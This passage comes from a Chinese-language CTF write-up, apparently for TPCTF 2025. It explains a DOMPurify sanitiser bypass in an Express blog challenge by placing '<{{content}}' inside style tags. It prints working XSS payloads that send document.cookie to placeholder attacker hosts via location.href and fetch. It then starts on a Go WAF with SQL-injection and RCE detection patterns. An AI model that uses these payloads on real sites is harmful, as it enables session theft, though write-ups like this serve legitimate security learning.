class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">import</span> session <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-session&#x27;</span>;<br><span class="hljs-keyword">import</span> rateLimit <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-rate-limit&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; randomBytes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;crypto&#x27;</span>;<br><span class="hljs-keyword">import</span> createDOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;dompurify&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jsdom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable language_">window</span> &#125; = <span class="hljs-keyword">new</span> <span class="hljs-title function_">JSDOM</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DOMPurify</span> = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-variable language_">window</span>);<br><br><span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_LAYOUT</span> = <span class="hljs-string">`</span><br><span class="hljs-string">&lt;article&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span><br><span class="hljs-string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/article&gt;</span><br><span class="hljs-string">`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LENGTH_LIMIT</span> = <span class="hljs-number">500</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  app.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-title function_">rateLimit</span>(&#123;<br>      <span class="hljs-attr">windowMs</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>    &#125;),<br>  );<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, _, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Cache-Control&#x27;</span>, <span class="hljs-string">&#x27;no-store&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>, &#123;<br>    <span class="hljs-attr">posts</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>,<br>    <span class="hljs-attr">maxLayout</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/post/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> body = posts.<span class="hljs-title function_">get</span>(id);<br>  <span class="hljs-keyword">if</span> (body === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post not found&#x27;</span>);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;post&#x27;</span>, &#123; id, body &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;cleared&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web server running on port 3000&#x27;</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>主要看这里</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>不仅过滤了<code>ALLOWED_ATTR: [],</code>还过滤了<code>ALLOW_ARIA_ATTR: false, ALLOW_DATA_ATTR: false,</code>那<code>aria</code> 和 <code>data</code>也用不了了</p><p>我们需要在不使用属性的情况下插入一个恶意标签。通常，恶意标签要么会被移除，要么会被转义，但我们可以在 <code>&lt;style&gt;</code> 中插入未被转义的尖括号。</p><p>DOMPurify 非常严格，会过滤掉 <code>&lt;style&gt;</code> 中的任何 HTML 标签。然而，正则表达式只检查 <code>/&lt;[/\w]/</code>，所以 <code>&lt;&#123;&#123;content&#125;&#125;</code> 不会被过滤，并且可以用来插入恶意标签</p><p>1.CVE-2023-48219</p><p>替换<code>&#123;&#123;content&#125;&#125;</code>为空来逃脱</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br>&#123; <span class="hljs-string">&quot;layout&quot;</span>: <span class="hljs-string">&quot;s&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;script&gt;location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.xxx.xxx.xxx:xxxx?flag=&quot;+document.cookie;&lt;&#123;&#123;content&#125;&#125;/script&gt;test&lt;/style&gt;&quot; &#125;</span><br><br>&#123; <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;layoutId&quot;</span>: <span class="hljs-number">2</span> &#125;<br></code></pre></td></tr></table></figure><p>第一个<code>&#123;&#123;content&#125;&#125;</code>用来闭合<code>style</code>标签,第二个<code>&#123;&#123;content&#125;&#125;</code>用来创建<code>script</code>标签</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312123632707.png" alt="image-20250312123632707"></p><p>成功跳转</p><p>2.构造恶意xss</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">logout： a&lt;style&gt;&#123;&#123;content&#125;&#125;&lt;&#123;&#123;content&#125;&#125;&lt;/style&gt;<br><br>content： img src onerror=<span class="hljs-title function_">fetch</span>(<span class="hljs-string">`&#123;YOUR_URL&#125;/`</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>) &lt;style&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>来使用<code>fetch</code>也可以，都是利用非恶意标签<code>&lt;style&gt;</code>来构造<code>xss</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312202007357.png" alt="image-20250312202007357"></p><h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p><a href="https://ouuan.moe/post/2025/03/tpctf-2025#are-you-incognito-3-solves">解法1</a></p><p>他们说是0day，我不到啊，0day拿来出题吗😭😅</p><p>复现不明白可还行😅</p><h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>源码：<br>waf函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;mime&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;regexp&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> backendURL = <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br><span class="hljs-keyword">const</span> backendHost = <span class="hljs-string">&quot;127.0.0.1:8000&quot;</span><br><br><span class="hljs-keyword">var</span> blockedIPs = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>&#123;<br><span class="hljs-string">&quot;1.1.1.1&quot;</span>: <span class="hljs-literal">true</span>,<br>&#125;<br><br><span class="hljs-keyword">var</span> sqlInjectionPattern = regexp.MustCompile(<span class="hljs-string">`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|#|\*\/|\/\*)`</span>)<br><br><span class="hljs-keyword">var</span> rcePattern = regexp.MustCompile(<span class="hljs-string">`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.+\))`</span>)<br><br><span class="hljs-keyword">var</span> hotfixPattern = regexp.MustCompile(<span class="hljs-string">`(?i)(select)`</span>)<br><br><span class="hljs-keyword">var</span> blockedUserAgents = []<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;sqlmap&quot;</span>,<br><span class="hljs-string">&quot;nmap&quot;</span>,<br><span class="hljs-string">&quot;curl&quot;</span>,<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isBlockedIP</span><span class="hljs-params">(ip <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> blockedIPs[ip]<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isMaliciousRequest</span><span class="hljs-params">(r *http.Request)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> r.URL.Query() &#123;<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 SQL 注入: 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> rcePattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 RCE 攻击: 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> hotfixPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> r.Method == http.MethodPost &#123;<br>ct := r.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>)<br>mediaType, _, err := mime.ParseMediaType(ct)<br><span 